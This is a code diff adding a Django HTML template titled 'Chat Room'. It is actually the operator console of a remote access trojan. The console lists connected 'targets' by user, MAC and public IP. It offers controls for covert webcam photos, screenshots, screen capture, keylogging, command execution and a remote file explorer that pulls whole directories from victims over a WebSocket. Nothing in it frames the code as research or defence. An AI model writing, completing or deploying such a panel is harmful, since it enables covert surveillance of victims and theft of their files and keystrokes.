@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+{% load static %}
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+    <title>Chat Room</title>
+    <link href="{% static 'one.css' %}" rel="stylesheet" type="text/css"/>
+    <script src="{% static 'jquery.js' %}"></script>
+</head>
+<body>
+<h2>Targets Connected</h2>
+<div style="overflow-x: scroll; padding-right: 10px; width: 90%">
+    <table id="user-table">
+        <thead>
+        <tr>
+            <th>Desktop</th>
+            <th>User</th>
+            <th>MAC Address</th>
+            <th>Public IP</th>
+            <th>Connected At</th>
+        </tr>
+        </thead>
+        <tbody id="user-list"></tbody>
+    </table>
+</div>
+
+
+<div style="" id="target-rc-div">
+    <button id="target-rc-close">Close</button>
+    <hr>
+    <marquee style="text-wrap: nowrap" id="target-username">Target:</marquee>
+    <hr>
+    <div id="target-rc-div-tab-buttons">
+        <button class="target-rc-div-tab-button active" onclick="">Cam Photo</button>
+        <button class="target-rc-div-tab-button" onclick="">Cam Video</button>
+        <button class="target-rc-div-tab-button" onclick="">Live Video</button>
+        <button class="target-rc-div-tab-button">Screenshot</button>
+        <button class="target-rc-div-tab-button">Live Screen Capture</button>
+        <button class="target-rc-div-tab-button">File Explorer</button>
+        <button class="target-rc-div-tab-button" onclick="">Key Log</button>
+        <button class="target-rc-div-tab-button" onclick="">Exec Command</button>
+    </div>
+    <div id="target-rc-div-tabs">
+        <div class="target-rc-div-tab">
+            <div id="cam-imgs"></div>
+            <button onclick="sendMessageToTarget('cam_photo')">Take Photo</button>
+        </div>
+        <div class="target-rc-div-tab">tab3</div>
+        <div class="target-rc-div-tab">tab4</div>
+        <div class="target-rc-div-tab">
+            <div id="captured-imgs"></div>
+            <button onclick="sendMessageToTarget('screenshot')">Capture Screen</button>
+        </div>
+        <div class="target-rc-div-tab">tab5</div>
+        <div class="target-rc-div-tab">
+            <div class="files-nav-btns">
+                <button class="files-nav-btn" onclick="goBack()">Back</button>
+                <button class="files-nav-btn" onclick="downloadCurrentDir()">Download DIR</button>
+            </div>
+            <div id="file-explorer-list">
+
+            </div>
+        </div>
+        <div class="target-rc-div-tab">tab7</div>
+        <div class="target-rc-div-tab">tab8</div>
+    </div>
+</div>
+
+{{ room_name|json_script:"room-name" }}
+
+<script>
+    let TARGET_NAME = ''
+    let selectedUserMacAddress = null;
+    let TARGET_DESKTOP = ''
+    const roomName = JSON.parse(document.getElementById('room-name').textContent);
+    const chatSocket = new WebSocket(
+        'ws://' + window.location.host + '/ws/chat/' + roomName + '/'
+    );
+
+
+    let fileExplorerHistory = [0];
+    let currentFilePath = '';
+
+    // Back navigation function
+    function goBack() {
+        sendMessageToTarget('file_explorer', {goto: fileExplorerHistory[fileExplorerHistory.indexOf(currentFilePath) - 1]});
+        currentFilePath = fileExplorerHistory[fileExplorerHistory.indexOf(currentFilePath) - 1];
+        fileExplorerHistory.pop(fileExplorerHistory.length)
+        console.log(fileExplorerHistory)
+    }
+
+    function downloadCurrentDir() {
+        console.log(fileExplorerHistory[fileExplorerHistory.length - 1])
+        sendMessageToTarget('file_explorer', {download: fileExplorerHistory[fileExplorerHistory.length - 1]})
+    }
+
+
+    async function getPublicIp() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Could not fetch public IP:', error);
+            return 'Unavailable';
+        }
+    }
+
+    chatSocket.onopen = async () => {
+        const desktop = navigator.userAgent; // Placeholder for desktop username
+        const macAddress = 'N/A'; // MAC address not accessible from JS
+        const publicIp = await getPublicIp();
+        const connectedAt = new Date().toLocaleString();
+
+        user_data = {
+            "type": "admin",
+            "desktop": "browser",
+            "macAddress": "N/A",
+            "publicIp": "N/A",
+            "username": "admin",
+        }
+
+        chatSocket.send(JSON.stringify(user_data));
+
+    };
+
+    chatSocket.onmessage = function (e) {
+        const data = JSON.parse(e.data);
+
+        if (data.type === 'users_connected') {
+            updateUserList(data.users);
+        }
+
+        if (data.type === 'target_data') {
+            switch (data.sec_type) {
+                case 'screenshot':
+                    const $img = $('<img>', {
+                        src: `data:image/png;base64,${data.data}`, // Set the src to the base64-encoded image
+                        css: {
+                            maxWidth: '100px',
+                            maxHeight: '100px'
+                        }
+                    });
+                    $('#captured-imgs').prepend($img)
+                    break;
+                case 'cam_photo':
+                    const $cam_photo = $('<img>', {
+                        src: `data:image/png;base64,${data.data}`, // Set the src to the base64-encoded image
+                        css: {
+                            maxWidth: '100px',
+                            maxHeight: '100px'
+                        }
+                    });
+                    $('#cam-imgs').prepend($cam_photo)
+                    break;
+                case 'file_explorer':
+                    const $fileList = $('#file-explorer-list'); // Div to display the file list
+                    $fileList.empty(); // Clear any previous data
+                    data.data.forEach(item => {
+                        // Choose icon based on item type
+                        const icon = item.type === 'folder' ? '📁' : '📄'; // Folder or file icon
+
+
+                        const $fileItem = $('<div>', {
+                            class: 'file-item',
+                            html: `${icon} ${item.name}`, // Display icon followed by item name
+                            click: function () {
+                                if (item.type === 'folder') {
+                                    currentFilePath = item.path;
+                                    if (item.path !== fileExplorerHistory[fileExplorerHistory.length - 1]) {
+                                        fileExplorerHistory.push(item.path);
+                                        console.log(fileExplorerHistory);
+                                    }
+                                    sendMessageToTarget('file_explorer', {goto: item.path}) // Call openFolder on click if it's a folder
+                                }
+                            }
+                        });
+
+                        // Add a download button/icon to the right
+                        const $downloadButton = $('<button>', {
+                            class: 'download-button',
+                            text: '⬇️',
+                            click: function (e) {
+                                e.stopPropagation(); // Prevents triggering the folder open on click
+                                sendMessageToTarget('file_explorer', {download: item.path});
+                            }
+                        });
+
+                         $fileItem.append($downloadButton);
+                         $fileList.append($fileItem);
+                    });
+                    break;
+                case 'download_folder':
+                    // Assume the data contains the filename and content fields
+                    const zipFilename = data.data.filename;
+                    const zipContent = data.data.content;
+
+                    // Decode the base64 string to binary
+                    const binaryString = atob(zipContent);
+                    const binaryLen = binaryString.length;
+                    const bytes = new Uint8Array(binaryLen);
+
+                    // Convert binary string to byte array
+                    for (let i = 0; i < binaryLen; i++) {
+                        bytes[i] = binaryString.charCodeAt(i);
+                    }
+
+                    // Create a Blob with the decoded data
+                    const blob = new Blob([bytes], {type: "application/zip"});
+                    const url = URL.createObjectURL(blob);
+
+                    // Create a hidden download link and simulate a click
+                    const downloadLink = document.createElement("a");
+                    downloadLink.href = url;
+                    downloadLink.download = zipFilename;
+                    downloadLink.style.display = "none"; // Hide the link
+
+                    document.body.appendChild(downloadLink);
+                    downloadLink.click(); // Trigger the download
+                    document.body.removeChild(downloadLink); // Remove the link after clicking
+
+                    // Revoke the object URL after some time to free up memory
+                    setTimeout(() => URL.revokeObjectURL(url), 10000); // 10 seconds
+
+                    sendMessageToTarget('file_explorer', {goto: fileExplorerHistory[fileExplorerHistory.indexOf(currentFilePath) - 1]});
+                    break;
+            }
+
+
+        }
+
+
+    };
+
+    chatSocket.onclose = function (e) {
+        console.error('Chat socket closed unexpectedly');
+    };
+
+    function updateUserList(users) {
+        const userList = document.querySelector('#user-list');
+        userList.innerHTML = ''; // Clear current list
+        users.forEach(user => {
+            const userItem = document.createElement('tr');
+            userItem.innerHTML = `
+                    <td>${user.desktop}</td>
+                    <td>${user.username}</td>
+                    <td>${user.macAddress}</td>
+                    <td>${user.publicIp}</td>
+                    <td>${user.connectedAt}</td>
+                `;
+            userList.appendChild(userItem);
+
+            $(userItem).click((event) => {
+                const tds = $(event.currentTarget).find('td');
+                const desktop = tds.eq(0).text(); // First <td>
+                const username = tds.eq(1).text(); // Second <td>
+
+                TARGET_DESKTOP = desktop;
+                TARGET_NAME = username;
+
+                const macAddress = tds.eq(2).text(); // Third <td>
+                selectedUserMacAddress = macAddress;
+
+                const publicIp = tds.eq(3).text(); // Fourth <td>
+                const connectedAt = tds.eq(4).text(); // Fifth <td>
+
+                $('#target-rc-div').show()
+                $('#target-username').text(`Target: ${username}| IP: ${publicIp} | MAC Address: ${macAddress}`);
+            });
+
+        });
+    }
+
+    $(document).ready(function () {
+        $('#target-rc-div').hide()
+    })
+
+    $('#target-rc-close').click(function () {
+        $('#target-rc-div').hide();
+        $('#target-rc-div').find('img').remove();
+    })
+
+    function sendMessageToTarget(message, kwargs = {}) {
+        if (selectedUserMacAddress) { // Ensure a user is selected
+            const payload = {
+                targetMacAddress: selectedUserMacAddress,
+                message: message,
+                type: "target_message",
+                ...kwargs
+            };
+            chatSocket.send(JSON.stringify(payload));
+        } else {
+            alert("Please select a user first.");
+        }
+    }
+
+
+    $(document).ready(function () {
+        // Handle tab button click
+        $('#target-rc-div-tab-buttons .target-rc-div-tab-button').click(function () {
+            // Remove 'active' class from all buttons and add to the clicked button
+            $('#target-rc-div-tab-buttons .target-rc-div-tab-button').removeClass('active');
+            $(this).addClass('active');
+
+            // Find the index of the clicked button
+            const index = $(this).index();
+            if ($(this).text().includes("File Explorer")) {
+                sendMessageToTarget('file_explorer')
+            }
+
+            // Show the corresponding tab and hide others
+            $('#target-rc-div-tabs .target-rc-div-tab').hide().eq(index).show();
+        });
+
+        // Initialize: hide all tabs except the first
+        $('#target-rc-div-tabs .target-rc-div-tab').hide().first().show();
+    });
+
+
+    function openFolder(path) {
+        // Send the path to the backend to get the contents of the selected folder
+        chatSocket.send(JSON.stringify({
+            type: 'explore_directory',
+            path: path
+        }));
+    }
+
+</script>
+</body>
+</html>
